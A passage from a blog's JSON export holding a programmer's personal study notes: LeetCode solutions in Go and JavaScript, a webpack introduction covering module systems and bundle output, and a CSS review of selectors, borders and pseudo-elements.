1&lt;&lt;maxChoosableInteger)\n    for i := range dp &#123;\n        dp[i] = -1\n    &#125;\n    var dfs func(int, int) int8\n    dfs = func(usedNum, curTot int) (res int8) &#123;\n        dv := &amp;dp[usedNum]\n        if *dv != -1 &#123;\n            return *dv\n        &#125;\n        defer func() &#123; *dv = res &#125;()\n        for i := 0; i &lt; maxChoosableInteger; i++ &#123;\n            if usedNum>>i&amp;1 == 0 &amp;&amp; (curTot+i+1 >= desiredTotal || dfs(usedNum|1&lt;&lt;i, curTot+i+1) == 0) &#123;\n                return 1\n            &#125;\n        &#125;\n        return\n    &#125;\n    return dfs(0, 0) == 1\n&#125;\n\n\n\n\ntitle:417. 太平洋大西洋水流问题time:link:code:796. 旋转字符串time:2022&#x2F;04&#x2F;07 10:28\nlink:https://leetcode-cn.com/problems/rotate-string/\ncode:/**\n * @param &#123;string&#125; s\n * @param &#123;string&#125; goal\n * @return &#123;boolean&#125;\n */\n var rotateString = function (s, goal) &#123;\n    let length = s.length;\n    let s1 = s\n    let sr = s.concat(s1)\n    let i = 0;\n    let j = length;\n    while (length--) &#123;\n        let x = sr.slice(i, j);\n        if (x == goal) &#123;\n            return true\n        &#125;\n        i++;\n        j++;\n    &#125;\n    return false\n&#125;;\nlet s = \"abcde\";\nlet goal = \"abced\"\nconsole.log(rotateString(s, goal))\n\n\n\n\n\n\n\n806. 写字符串需要的行数time:2022&#x2F;04&#x2F;12 19:36\nlink:https://leetcode-cn.com/problems/number-of-lines-to-write-string/\ncode:/**\n * @param &#123;number[]&#125; widths\n * @param &#123;string&#125; s\n * @return &#123;number[]&#125;\n */\nvar numberOfLines = function (widths, s) &#123;\n    let col = 0\n    let row = 0\n    let w = 0\n    let fail = 0\n    for (let i = 0; i &lt; s.length; i++) &#123;\n        let index = Number(s[i]) - 97\n        w = widths[index]\n        col += w\n        fail = col\n        if (col == 100) &#123;\n            row++\n            col = 0\n        &#125; else if (col > 100) &#123;\n            i--\n            row++\n            col = 0\n        &#125;\n    &#125;\n    console.log(row, fail)\n&#125;;\nlet widths = [10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10]\nlet S = \"abcdefghijklmnopqrstuvwxyz\"\nnumberOfLines(widths,S)\n\n\n\n1672. 最富有客户的资产总量time2022&#x2F;04&#x2F;14 19:10\nlink:https://leetcode-cn.com/problems/richest-customer-wealth/\ncode/**\n * @param &#123;number[][]&#125; accounts\n * @return &#123;number&#125;\n */\nvar maximumWealth = function (accounts) &#123;\n    let ans=[]\n    for(let i=0;i&lt;accounts.length;i++)&#123;\n        let sum=0;\n        for(let j=0;j&lt;accounts[i].length;j++)&#123;\n            sum+=accounts[i][j]\n        &#125;\n        ans.push(sum)\n    &#125;\n    return Math.max(...ans)\n&#125;;\nlet accounts = [[1, 2, 3], [3, 2, 1]]\nconsole.log(maximumWealth(accounts))\n\n\n\n\n\n253 . 会议室 IItime:2022&#x2F;04&#x2F;14 21:22\nlinkhttps://leetcode-cn.com/problems/meeting-rooms-ii/submissions/\ncode\n\n\n\n1446. 连续字符time:2021&#x2F;12&#x2F;12 22:12\ncode:package main\n\nimport \"fmt\"\n\nfunc main() &#123;\n\ts := \"\"\n\tfmt.Scanln(&amp;s)\n\tans := maxPower(s)\n\tfmt.Println(ans)\n\n&#125;\nfunc maxPower(s string) int &#123;\n\tans, cnt := 1, 1\n\tfor i := 0; i &lt; len(s)-1; i++ &#123;\n\t\tif s[i] == s[i+1] &#123;\n\t\t\tcnt += 1\n\t\t\tif ans &lt; cnt &#123;\n\t\t\t\tans = cnt\n\t\t\t&#125;\n\n\t\t&#125; else &#123;\n\t\t\tcnt = 1\n\t\t&#125;\n\t&#125;\n\n\treturn ans\n&#125;\n\n\n\n\n506. 相对名次time:code:807. 保持城市天际线time:2021&#x2F;12&#x2F;13 11:17\ncodepackage main\n\nimport \"fmt\"\n\nfunc main() &#123;\n\tgrid := [][]int&#123;\n\t\t&#123;3, 0, 8, 4&#125;,\n\t\t&#123;2, 4, 5, 7&#125;,\n\t\t&#123;9, 2, 6, 3&#125;,\n\t\t&#123;0, 3, 1, 0&#125;,\n\t&#125;\n\tans := maxIncreaseKeepingSkyline(grid)\n\tfmt.Println(ans)\n\n&#125;\nfunc maxIncreaseKeepingSkyline(grid [][]int) int &#123;\n\tans := 0\n\trowMax := make([]int, len(grid))\n\tcolMax := make([]int, len(grid))\n\tfor i := 0; i &lt; len(grid); i++ &#123;\n\t\tfor j := 0; j &lt; len(grid); j++ &#123;\n\t\t\trowMax[i] = Max(rowMax[i], grid[i][j])\n\t\t\tcolMax[j] = Max(colMax[j], grid[i][j])\n\t\t&#125;\n\t&#125;\n\tfor i := 0; i &lt; len(grid); i++ &#123;\n\t\tfor j := 0; j &lt; len(grid); j++ &#123;\n\t\t\tans = ans + (Min(rowMax[i], colMax[j]) - grid[i][j])\n\t\t&#125;\n\t&#125;\n\treturn ans\n\n&#125;\nfunc Max(a, b int) int &#123;\n\tif a > b &#123;\n\t\treturn a\n\t&#125; else &#123;\n\t\treturn b\n\t&#125;\n&#125;\nfunc Min(a, b int) int &#123;\n\tif a > b &#123;\n\t\treturn b\n\t&#125; else &#123;\n\t\treturn a\n\t&#125;\n&#125;\n\n\n\n\n1518. 换酒问题time:2021&#x2F;12&#x2F;17 21:36\ncode:package main\n\nimport \"fmt\"\n\nfunc main() &#123;\n\tvar numBottles, numExchange int\n\tfmt.Scanf(\"%d %d\", &amp;numBottles, &amp;numExchange)\n\tans := numWaterBottles(numBottles, numExchange)\n\tfmt.Println(ans)\n&#125;\nfunc numWaterBottles(numBottles int, numExchange int) int &#123;\n\tsum := numBottles\n\tfor numBottles >= numExchange &#123;\n\t\ts := numBottles % numExchange\n\t\tsum += numBottles / numExchange\n\t\tnumBottles = numBottles/numExchange + s\n\t&#125;\n\treturn sum\n&#125;\n\n\n\n\n419. 甲板上的战舰time： 2021&#x2F;12&#x2F;18 11:08\ncode:package main\n\nimport \"fmt\"\n\nfunc main() &#123;\n\tvar board = [][]byte&#123;&#125;\n\n\tfmt.Println(countBattleships(board))\n&#125;\nfunc countBattleships(board [][]byte) (ans int) &#123;\n\tm, n := len(board), len(board[0])\n\tfor i, row := range board &#123;\n\t\tfor j, ch := range row &#123;\n\t\t\tif ch == 'X' &#123;\n\t\t\t\trow[j] = '.'\n\t\t\t\tfor k := j + 1; k &lt; n &amp;&amp; row[k] == 'X'; k++ &#123;\n\t\t\t\t\trow[k] = '.'\n\t\t\t\t&#125;\n\t\t\t\tfor k := i + 1; k &lt; m &amp;&amp; board[k][j] == 'X'; k++ &#123;\n\t\t\t\t\tboard[k][j] = '.'\n\t\t\t\t&#125;\n\t\t\t\tans++\n\t\t\t&#125;\n\t\t&#125;\n\t&#125;\n\treturn\n&#125;\n\n\n\n\n997. 找到小镇的法官time: 2021&#x2F;12&#x2F;19 21:14\ncode:package main\n\nimport \"fmt\"\n\nfunc main() &#123;\n\n\ttrust := [][]int&#123;\n\t\t&#123;1, 3&#125;,\n\t\t&#123;1, 4&#125;,\n\t\t&#123;2, 3&#125;,\n\t\t&#123;2, 4&#125;,\n\t\t&#123;4, 3&#125;,\n\t&#125;\n\tn := 4\n\tans := findJudge(n, trust)\n\tfmt.Println(ans)\n\n&#125;\nfunc findJudge(n int, trust [][]int) int &#123;\n\tif n == 1 &#123;\n\t\treturn 1\n\t&#125;\n\tList1 := make(map[int]int, 0)\n\tList2 := make(map[int]int, 0)\n\tfor _, v := range trust &#123;\n\t\tList1[v[0]]++\n\t\tList2[v[1]]++\n\n\t&#125;\n\n\tfor f, x := range List2 &#123;\n\t\t_, ok := List1[f]\n\t\tif !ok &amp;&amp; x == n-1 &#123;\n\t\t\treturn f\n\t\t&#125;\n\t&#125;\n\treturn -1\n\n&#125;\n\n\n\n\n1154. 一年中的第几天time: 2021&#x2F;12&#x2F;21 22:41\ncode:package main\n\nimport (\n\t\"fmt\"\n\t\"strconv\"\n\t\"strings\"\n)\n\nfunc main() &#123;\n\n\ts := \"2004-03-01\"\n\tans := dayOfYear(s)\n\tfmt.Println(ans)\n&#125;\nfunc dayOfYear(date string) int &#123;\n\n\tyear, _ := strconv.Atoi(strings.Split(date, \"-\")[0])\n\tmon, _ := strconv.Atoi(strings.Split(date, \"-\")[1])\n\tday, _ := strconv.Atoi(strings.Split(date, \"-\")[2])\n\tsum := day\n\tif mon > 2 &#123;\n\t\tFlag := Year(year)\n\t\tif Flag == 1 &#123;\n\t\t\tsum += 29\n\t\t&#125; else &#123;\n\t\t\tsum += 28\n\t\t&#125;\n\t&#125;\n\n\tfor i := mon - 1; i > 0; i-- &#123;\n\t\tif i != 2 &#123;\n\t\t\tsum += montn(i)\n\t\t&#125;\n\t&#125;\n\treturn sum\n&#125;\nfunc Year(year int) int &#123;\n\n\tif year%4 == 0 &amp;&amp; year%100 != 0 || year%400 == 0 &#123;\n\t\treturn 1\n\t&#125; else &#123;\n\t\treturn 0\n\t&#125;\n&#125;\nfunc montn(mon int) int &#123;\n\tif mon == 1 || mon == 3 || mon == 5 || mon == 7 || mon == 8 || mon == 10 || mon == 12 &#123;\n\t\treturn 31\n\t&#125; else &#123;\n\t\treturn 30\n\t&#125;\n&#125;\n\n\n\n\n686. 重复叠加字符串匹配time:2021&#x2F;12&#x2F;22 16:11\ncode:package main\n\nimport (\n\t\"fmt\"\n\t\"strings\"\n)\n\nfunc main() &#123;\n\n\ta := \"abcabcabcabc\"\n\tb := \"abac\"\n\tans := repeatedStringMatch(a, b)\n\tfmt.Println(ans)\n\n&#125;\nfunc repeatedStringMatch(a string, b string) int &#123;\n\t//flag := strings.Contains(b, a)\n\t//if flag &#123;\n\tfor _, v := range b &#123;\n\t\tif strings.Contains(a, string(v)) == false &#123;\n\t\t\treturn -1\n\t\t&#125;\n\t&#125;\n\tcount := 0\n\tstr := \"\"\n\tx := strings.Contains(str, b)\n\tfor x == false &#123;\n\t\tstr += a\n\t\tx = strings.Contains(str, b)\n\t\tcount++\n\t\tif count>=2*len(a)+len(b)&#123;\n\t\t\treturn -1\n\t\t&#125;\n\t&#125;\n\treturn count\n\t//&#125; else &#123;\n\t//\treturn -1\n\t//&#125;\n\n&#125;\n\n\n1001. 网格照明time:code:func gridIllumination(n int, lamps, queries [][]int) []int &#123;\n    type pair struct&#123; x, y int &#125;\n    points := map[pair]bool&#123;&#125;\n    row := map[int]int&#123;&#125;\n    col := map[int]int&#123;&#125;\n    diagonal := map[int]int&#123;&#125;\n    antiDiagonal := map[int]int&#123;&#125;\n    for _, lamp := range lamps &#123;\n        r, c := lamp[0], lamp[1]\n        p := pair&#123;r, c&#125;\n        if points[p] &#123;\n            continue\n        &#125;\n        points[p] = true\n        row[r]++\n        col[c]++\n        diagonal[r-c]++\n        antiDiagonal[r+c]++\n    &#125;\n\n    ans := make([]int, len(queries))\n    for i, query := range queries &#123;\n        r, c := query[0], query[1]\n        if row[r] > 0 || col[c] > 0 || diagonal[r-c] > 0 || antiDiagonal[r+c] > 0 &#123;\n            ans[i] = 1\n        &#125;\n        for x := r - 1; x &lt;= r+1; x++ &#123;\n            for y := c - 1; y &lt;= c+1; y++ &#123;\n                if x &lt; 0 || y &lt; 0 || x >= n || y >= n || !points[pair&#123;x, y&#125;] &#123;\n                    continue\n                &#125;\n                delete(points, pair&#123;x, y&#125;)\n                row[x]--\n                col[y]--\n                diagonal[x-y]--\n                antiDiagonal[x+y]--\n            &#125;\n        &#125;\n    &#125;\n    return ans\n&#125;\n\n\n\n1342. 将数字变成 0 的操作次数time: 2022&#x2F;01&#x2F;31 13:39\ncode:package main\n\n// func main() &#123;\n// \tx := 123\n// \tans := numberOfSteps(x)\n// \tfmt.Println(ans)\n\n// &#125;\nfunc numberOfSteps(num int) int &#123;\n\tcount := 0\n\tfor num != 0 &#123;\n\t\tif num%2 == 0 &#123;\n\t\t\tnum = num / 2\n\t\t\tcount++\n\t\t&#125; else &#123;\n\t\t\tnum = num - 1\n\t\t\tcount++\n\t\t&#125;\n\t&#125;\n\treturn count\n&#125;\n\n\n\n\n1491. 去掉最低工资和最高工资后的工资平均值time: 2022&#x2F;01&#x2F;31 18:06\ncode:package main\n\nimport \"fmt\"\n\nfunc main() &#123;\n\tsalary := []int&#123;8000, 9000, 2000, 3000, 6000, 1000&#125;\n\tans := average2(salary)\n\tfmt.Println(ans)\n&#125;\nfunc average2(salary []int) float64 &#123;\n\tM := salary[0]\n\tN := salary[0]\n\tvar sum float64\n\tfor item := range salary &#123;\n\t\tsum = sum + float64(salary[item])\n\t\tif salary[item] > M &#123;\n\t\t\tM = salary[item]\n\t\t&#125;\n\t\tif salary[item] &lt; N &#123;\n\t\t\tN = salary[item]\n\t\t&#125;\n\n\t&#125;\n\treturn (sum - float64(M) - float64(N)) / float64(len(salary)-2)\n&#125;\n\nfunc average(salary []int) float64 &#123;\n\tM := max(salary)\n\tN := min(salary)\n\tvar sum float64\n\tfor j := 0; j &lt; len(salary); j++ &#123;\n\t\tif j != M &amp;&amp; j != N &#123;\n\t\t\tsum = sum + float64(salary[j])\n\t\t&#125;\n\n\t&#125;\n\treturn sum / float64(len(salary)-2)\n\n&#125;\nfunc max(salary []int) int &#123;\n\tmax := 0\n\n\tfor i := 1; i &lt; len(salary); i++ &#123;\n\t\tif salary[max] &lt; salary[i] &#123;\n\t\t\tmax = i\n\t\t&#125;\n\t&#125;\n\treturn max\n\n&#125;\nfunc min(salary []int) int &#123;\n\tmin := 0\n\tfor i := 1; i &lt; len(salary); i++ &#123;\n\t\tif salary[min] > salary[i] &#123;\n\t\t\tmin = i\n\t\t&#125;\n\t&#125;\n\treturn min\n&#125;\n\n\n\n\n\n\n1523. 在区间范围内统计奇数数目time:2022&#x2F;01&#x2F;31 13:53\ncode:package main\n\n// import \"fmt\"\n\n// func main() &#123;\n// \tlow := 3\n// \thigh := 7\n// \tx := countOdds(low, high)\n// \tfmt.Println(x)\n\n// &#125;\nfunc countOdds(low int, high int) int &#123;\n\tif low%2 == 0 &amp;&amp; high%2 == 0 &#123;\n\t\treturn (high - low) / 2\n\t&#125; else &#123;\n\t\treturn (high-low)/2 + 1\n\t&#125;\n\n&#125;\n\n\n\n\n2000. 反转单词前缀time:2022&#x2F;02&#x2F;03 15:09\ncode:package main\n\nimport (\n\t\"fmt\"\n\t\"strings\"\n)\n\nfunc main() &#123;\n\tword := \"abcd\"\n\tvar ch byte = 'z'\n\tans := reversePrefix(word, ch)\n\tfmt.Println(ans)\n\n&#125;\nfunc reversePrefix(word string, ch byte) string &#123;\n\tindex := strings.IndexByte(word, ch)\n\tif index == -1 &#123;\n\t\treturn word\n\t&#125;\n\n\tans := reverse(word, index)\n\treturn ans\n\n&#125;\nfunc reverse(str string, index int) string &#123;\n\t// write code here\n\tr := []rune(str)\n\tfor i, j := 0, index; i &lt; j; i, j = i+1, j-1 &#123;\n\t\tr[i], r[j] = r[j], r[i]\n\t&#125;\n\treturn string(r)\n&#125;\n\n\n1414. 和为 K 的最少斐波那契数字数目time:2022&#x2F;02&#x2F;03 15:56\ncode:package main\n\nimport \"fmt\"\n\nfunc main() &#123;\n\n\tk := 19\n\tans := findMinFibonacciNumbers(k)\n\tfmt.Println(ans)\n\n&#125;\nfunc findMinFibonacciNumbers(k int) int &#123;\n\tnum := []int&#123;1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987, 1597, 2584, 4181, 6765, 10946, 17711, 28657, 46368, 75025, 121393, 196418, 317811, 514229, 832040, 1346269, 2178309, 3524578, 5702887, 9227465, 14930352, 24157817, 39088169, 63245986, 102334155, 165580141, 267914296, 433494437, 701408733&#125;\n\t//num := []int&#123;1, 2, 3, 5, 8, 13, 21, 34&#125;\n\tcount := 0\n\n\tfor i := len(num) - 1; i >= 0; i-- &#123;\n\t\tif k == 0 &#123;\n\t\t\tbreak\n\t\t&#125;\n\n\t\tif num[i] &lt;= k &#123;\n\t\t\tcount++\n\t\t\tk -= num[i]\n\n\t\t&#125;\n\n\t&#125;\n\treturn count\n&#125;\n\n\n\n\n1725. 可以形成最大正方形的矩形数目time:2022&#x2F;02&#x2F;05 14:37\ncode:package main\n\nimport \"fmt\"\n\nfunc main() &#123;\n\trectangles := [][]int&#123;&#123;5, 8&#125;, &#123;3, 9&#125;, &#123;3, 12&#125;&#125;\n\tans := countGoodRectangles(rectangles)\n\tfmt.Println(ans)\n\n&#125;\nfunc countGoodRectangles(rectangles [][]int) int &#123;\n\tnum := make(map[int]int, 0)\n\tfor item := range rectangles &#123;\n\t\tif rectangles[item][0] &lt; rectangles[item][1] &#123;\n\t\t\tnum[rectangles[item][0]]++\n\t\t&#125; else &#123;\n\t\t\tnum[rectangles[item][1]]++\n\t\t&#125;\n\t&#125;\n\tans := 0\n\tfor i := range num &#123;\n\t\tfmt.Println(i)\n\t\tif i > ans &#123;\n\t\t\tans = i\n\t\t&#125;\n\t&#125;\n\treturn num[ans]\n&#125;\n\n\n1748. 唯一元素的和time:2022&#x2F;02&#x2F;06 19:47\ncode:package main\n\nimport \"fmt\"\n\nfunc main() &#123;\n\tnums := []int&#123;1, 2, 3, 4,5&#125;\n\tans := sumOfUnique(nums)\n\tfmt.Println(ans)\n&#125;\nfunc sumOfUnique(nums []int) int &#123;\n\tm := make(map[int]int, 0)\n\tfor i := range nums &#123;\n\t\tm[nums[i]]++\n\t&#125;\n\tsum := 0\n\tfor key, value := range m &#123;\n\t\tif value == 1 &#123;\n\t\t\tsum += key\n\t\t&#125;\n\t&#125;\n\treturn sum\n&#125;\n\n\n","slug":"Leetcode每日一题","date":"2022-04-27T09:33:00.000Z","categories_index":"","tags_index":"leetcode","author_index":"kif"},{"id":"4524d999cf615adfc697a0734aafb525","title":"webpack学习笔记","content":"学习中。。。\nwebpack为什么需要Webpack原始开发模式各种js文件引入，顺序不能乱，引入的数据太大，各种js之间有关联，可以考虑所有文件复制到一个js文件里，但又有作用域问题、文件太大、可维护性差\n作用域问题：grunt和gulp两个工具来解决\n方法：立即执行函数\n; (function () &#123;\n    let myName = 'kif'\n&#125;)()\nconsole.log(myName)//ReferenceError: myName is not defined\nlet res = (function () &#123;\n    let myName = 'kif'\n    return myName\n&#125;)()\nconsole.log(res)//kif\n\n文件太大：对于可以js库，只使用其中一个方法而把所有的js文件加载下来不适合\n方法：代码差分 commonJs\nCommonJS 模块规范代表：Node.js\n每个文件就是一个模块，有自己的作用域。在一个文件里面定义的变量、函数、类，都是私有的，对其他文件不可见。\n暴露方法：module.exports\nmath.js:\nconst add = function (x, y) &#123;\n    return x + y\n&#125;\nconst sub = function (x, y) &#123;\n    return x - y\n&#125;\nmodule.exports = &#123;\n    add,\n    sub\n&#125;\n\n引用方法:require\nconst math = require('./math.js')\nconsole.log(math.add(4, 5))\n\n但只能在Nodejs环境下运行，对于浏览器环境不支持requirejs暴露方法：define([],function(){})\n参数1：[]，内容是需要的模块\n参数2：function:回调函数，return 暴露的方法\neg:\nadd.js\nconst add=(x,y)=>&#123;\n    return x+y\n&#125;\ndefine([],function()&#123;\n    return add\n&#125;)\n\n引用方法：require([],function(){})\n参数1：引入模块文件\n参数2：回调函数，参数是方法，内容直接使用方法\neg:\nserver.js\nrequire(['./add.js'], function (add) &#123;\n    console.log(add(4, 5))\n&#125;)\n\n&lt;!DOCTYPE html>\n&lt;html lang=\"en\">\n&lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    &lt;title>Document&lt;/title>\n    &lt;script src=\"https://cdn.bootcdn.net/ajax/libs/require.js/2.3.6/require.js\"\n    data-main=\"../server.js\">&lt;/script>\n&lt;/head>\n&lt;body>\n    \n&lt;/body>\n&lt;/html>\n\n\nECMAScript暴露方法export default\neg:\nadd.js\nconst add = function(x,y)&#123;\n\treturn x+y\n&#125;\nexport default add\n\n\n\n引用方法import from\neg:\nimport add from './add.js'\nadd(1,2)\n\n注：script标签需要指定type&#x3D;”module”,否则：\n\n问题：部分浏览器不支持\nwebpack就可以支持connonjs和使得ECMAScript良好兼容浏览器webpack和同类工具比较parcel“零配置”，少量的库\nrollup只用来打包js\nwebpack拆分代码、继承大量库、静态文件，支持Commonjs,ESMAScript\nViteVue官方,基于esmodule\nwebpack使用前提：nodejs\n\n安装：\nnpm install webpack webpack-cli --g\n\n全局安装\n\n当前工作区安装\nnpm init -y\nnpm install webpack webpack-cli --save-dev\n\n\n将hello.js 和main.js打包\nhello.js\nfunction hello()&#123;\n    console.log('hello world')\n&#125;\n\nexport default hello\n\nmain.js\nimport hello from './hello.js'\nhello()\n\n可以注意到使用的的是ESmodule方法\n打包：webpack\n\n生成dist&#x2F;bundle.js\n/******/ (() => &#123; // webpackBootstrap\n/******/ \t\"use strict\";\n/******/ \tvar __webpack_modules__ = ([\n/* 0 */,\n/* 1 */\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => &#123;\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, &#123;\n/* harmony export */   \"default\": () => (__WEBPACK_DEFAULT_EXPORT__)\n/* harmony export */ &#125;);\nfunction hello()&#123;\n    console.log('hello world')\n&#125;\n\n/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = (hello);\n\n/***/ &#125;)\n/******/ \t]);\n/************************************************************************/\n/******/ \t// The module cache\n/******/ \tvar __webpack_module_cache__ = &#123;&#125;;\n/******/ \t\n/******/ \t// The require function\n/******/ \tfunction __webpack_require__(moduleId) &#123;\n/******/ \t\t// Check if module is in cache\n/******/ \t\tvar cachedModule = __webpack_module_cache__[moduleId];\n/******/ \t\tif (cachedModule !== undefined) &#123;\n/******/ \t\t\treturn cachedModule.exports;\n/******/ \t\t&#125;\n/******/ \t\t// Create a new module (and put it into the cache)\n/******/ \t\tvar module = __webpack_module_cache__[moduleId] = &#123;\n/******/ \t\t\t// no module.id needed\n/******/ \t\t\t// no module.loaded needed\n/******/ \t\t\texports: &#123;&#125;\n/******/ \t\t&#125;;\n/******/ \t\n/******/ \t\t// Execute the module function\n/******/ \t\t__webpack_modules__[moduleId](module, module.exports, __webpack_require__);\n/******/ \t\n/******/ \t\t// Return the exports of the module\n/******/ \t\treturn module.exports;\n/******/ \t&#125;\n/******/ \t\n/************************************************************************/\n/******/ \t/* webpack/runtime/define property getters */\n/******/ \t(() => &#123;\n/******/ \t\t// define getter functions for harmony exports\n/******/ \t\t__webpack_require__.d = (exports, definition) => &#123;\n/******/ \t\t\tfor(var key in definition) &#123;\n/******/ \t\t\t\tif(__webpack_require__.o(definition, key) &amp;&amp; !__webpack_require__.o(exports, key)) &#123;\n/******/ \t\t\t\t\tObject.defineProperty(exports, key, &#123; enumerable: true, get: definition[key] &#125;);\n/******/ \t\t\t\t&#125;\n/******/ \t\t\t&#125;\n/******/ \t\t&#125;;\n/******/ \t&#125;)();\n/******/ \t\n/******/ \t/* webpack/runtime/hasOwnProperty shorthand */\n/******/ \t(() => &#123;\n/******/ \t\t__webpack_require__.o = (obj, prop) => (Object.prototype.hasOwnProperty.call(obj, prop))\n/******/ \t&#125;)();\n/******/ \t\n/******/ \t/* webpack/runtime/make namespace object */\n/******/ \t(() => &#123;\n/******/ \t\t// define __esModule on exports\n/******/ \t\t__webpack_require__.r = (exports) => &#123;\n/******/ \t\t\tif(typeof Symbol !== 'undefined' &amp;&amp; Symbol.toStringTag) &#123;\n/******/ \t\t\t\tObject.defineProperty(exports, Symbol.toStringTag, &#123; value: 'Module' &#125;);\n/******/ \t\t\t&#125;\n/******/ \t\t\tObject.defineProperty(exports, '__esModule', &#123; value: true &#125;);\n/******/ \t\t&#125;;\n/******/ \t&#125;)();\n/******/ \t\n/************************************************************************/\nvar __webpack_exports__ = &#123;&#125;;\n// This entry need to be wrapped in an IIFE because it need to be isolated against other modules in the chunk.\n(() => &#123;\n__webpack_require__.r(__webpack_exports__);\n/* harmony import */ var _hello_js__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(1);\n\n(0,_hello_js__WEBPACK_IMPORTED_MODULE_0__[\"default\"])()\n&#125;)();\n\n/******/ &#125;)()\n;\n\n\n\n\n\nResource资源模块module:&#123;\n    rules:[\n        &#123;\n        test: /\\.png/, //匹配资源名称，这里是png图片\n        type: \"asset/resource\", //asset/resource 将资源分割为单独的文件，并导出url，就是之前的 file-loader的功能.\n        generator: &#123;\n          filename: \"images/[hash][ext][query]\",\n        &#125;, //输出文件位置与名称\n      &#125;,\n    ]\n&#125;\n\n","slug":"webpack学习笔记","date":"2022-04-02T07:36:00.000Z","categories_index":"学习笔记,前端","tags_index":"webpack","author_index":"kif"},{"id":"b7900de07f93af39b5cf843c09c67750","title":"重温前端-css篇","content":"CSS1.css选择某一个 (CSS :first-child 选择器,CSS选择器——伪类选择器)q:请将html模块中ul列表的第2个li标签和第4个li标签的背景颜色设置成”rgb(255, 0, 0)”。\n&lt;html>\n    &lt;head>\n        &lt;meta charset=utf-8>\n        &lt;style type=\"text/css\">\n            /*补全代码*/\n            \n        &lt;/style>\n    &lt;/head>\n    &lt;body>\n        &lt;ul>\n            &lt;li>1&lt;/li>\n            &lt;li>2&lt;/li>\n            &lt;li>3&lt;/li>\n            &lt;li>4&lt;/li>\n        &lt;/ul>\n    &lt;/body>\n&lt;/html>\n\nCSS :first-child 选择器：:first-child 选择器用于选取属于其父元素的首个子元素的指定选择器。\nul > :first-child + li&#123;\n    margin-right: 50px;\n&#125;\n\nul > :first-child + li + li+ li&#123;\n    margin-right: 50px;\n&#125;\n\n\n\n2、CSS 边框属性p\n  &#123;\n  border:5px solid red;\n  &#125;\n\n可以按顺序设置如下属性：\n\nborder-width\nborder-style\nborder-color\n\nborder-style可能的值\n\n\n值\n描述\n\n\n\nnone\n定义无边框。\n\n\nhidden\n与 “none” 相同。不过应用于表时除外，对于表，hidden 用于解决边框冲突。\n\n\ndotted\n定义点状边框。在大多数浏览器中呈现为实线。\n\n\ndashed\n定义虚线。在大多数浏览器中呈现为实线。\n\n\nsolid\n定义实线。\n\n\ndouble\n定义双线。双线的宽度等于 border-width 的值。\n\n\ngroove\n定义 3D 凹槽边框。其效果取决于 border-color 的值。\n\n\nridge\n定义 3D 垄状边框。其效果取决于 border-color 的值。\n\n\ninset\n定义 3D inset 边框。其效果取决于 border-color 的值。\n\n\noutset\n定义 3D outset 边框。其效果取决于 border-color 的值。\n\n\ninherit\n规定应该从父元素继承边框样式。\n\n\neg:\n圣诞节来啦！请用CSS给你的朋友们制作一颗圣诞树吧~这颗圣诞树描述起来是这样的：\n1. &quot;topbranch&quot;是圣诞树的上枝叶，该上枝叶仅通过边框属性、左浮动、左外边距即可实现。边框的属性依次是：宽度为100px、是直线、颜色为green（未显示的边框颜色都为透明）\n2. &quot;middleBranch&quot;是圣诞树的中枝叶，该上枝叶仅通过边框属性即可实现。边框的属性依次是：宽度为200px、是直线、颜色为green（未显示的边框颜色都为透明）\n3. &quot;base&quot;是圣诞树的树干，该树干仅通过左外边距实现居中于中枝叶。树干的宽度、高度分别为70px、200px，颜色为gray。\n注意：\n1. 上枝叶、树干的居中都是通过左外边距实现的\n2. 没有显示的边框，其属性都是透明（属性）\n3. 仅通过border属性完成边框的所有属性设置\n\n\n&lt;!DOCTYPE html>\n&lt;html>\n    &lt;head>\n        &lt;meta charset=utf-8>\n        &lt;style type=\"text/css\">\n            .topbranch &#123;\n                width: 0px;\n                height: 0px;\n                /*\n                * TODO: 上枝叶效果\n                */\n               float:left;\n               border-bottom:100px solid green;\n               border-left:100px solid transparent;\n               border-right:100px solid transparent;\n               border-top:100px solid transparent;\n               margin-left:100px\n               \n                \n            &#125;\n            .middleBranch &#123;\n                width: 0px;\n                height: 0px;\n                /*\n                * TODO: 中枝叶效果\n                */\n                border-bottom:200px solid green;\n                border-left:200px solid transparent;\n                 border-top:200px solid transparent;\n                 border-right:200px solid transparent;\n                \n                \n            &#125;\n            .base &#123;\n                /*\n                * TODO: 树干效果\n                */\n                width:70px;\n                height:200px;\n                background-color:gray;\n                float:left;\n                margin-left:165px\n                \n            &#125;\n        &lt;/style>\n    &lt;/head>\n    &lt;body>\n    \t&lt;section class=\"topbranch\">&lt;/section>\n        &lt;section class=\"middleBranch\">&lt;/section>\n        &lt;section class=\"base\">&lt;/section>\n    &lt;/body>\n&lt;/html>\n\n3、 CSS选择器——伪元素伪元素是一个附加在选择器末尾的关键词，通过伪元素您不需要借助元素的 ID 或 class 属性就可以对被选择元素的特定部分定义样式。例如通过伪元素您可以设置段落中第一个字母的样式，或者在元素之前、之后插入一些内容等等。\n在 CSS1 和 CSS2 中，伪元素的使用与伪类相同，都是使一个冒号:与选择器相连。但在 CSS3 中，将伪元素单冒号的使用方法改为了使用双冒号::，以此来区分伪类和伪元素。因此，建议在使用伪元素时使用双冒号而不是单冒号。\nselector::pseudo-element &#123;\n  property: value;\n&#125;\n\n其中，selector 为选择器，pseudo-element 为伪元素的名称，property 为 CSS 中的属性，value 为属性对应的值。\nCSS 中提供了一系列的伪元素，如下表所示：\n\n\n\n伪元素\n例子\n例子描述\n\n\n\n::after\np::after\n在每个  元素之后插入内容\n\n\n::before\np::before\n在每个  元素之前插入内容\n\n\n::first-letter\np::first-letter\n匹配每个  元素中内容的首字母\n\n\n::first-line\np::first-line\n匹配每个  元素中内容的首行\n\n\n::selection\np::selection\n匹配用户选择的元素部分\n\n\n::placeholder\ninput::placeholder\n匹配每个表单输入框（例如 input）的 placeholder 属性\n\n\n1. ::after伪元素 ::after 能够在指定元素的后面插入一些内容，在 ::after 中需要使用 content 属性来定义要追加的内容，而且在 